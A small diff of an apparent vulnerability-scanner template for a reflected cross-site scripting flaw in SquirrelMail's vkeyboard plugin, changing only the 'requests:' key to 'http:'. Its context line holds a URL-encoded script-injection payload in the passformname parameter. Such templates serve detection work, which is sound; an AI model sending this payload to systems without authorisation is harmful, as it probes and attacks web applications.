@@ -8,7 +8,7 @@ info:
   reference: https://www.exploit-db.com/exploits/34814
   tags: xss,squirrelmail,plugin
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/plugins/vkeyboard/vkeyboard.php?passformname=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
